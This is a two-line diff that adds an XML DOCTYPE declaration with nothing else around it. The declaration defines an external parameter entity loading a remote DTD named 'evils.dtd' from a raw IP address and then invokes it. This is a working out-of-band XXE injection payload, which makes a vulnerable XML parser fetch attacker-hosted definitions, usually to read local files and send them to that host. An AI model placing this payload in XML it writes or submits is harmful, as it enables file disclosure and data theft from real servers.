@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM
+"http://62.84.186.132/evils.dtd"> %remote;]>
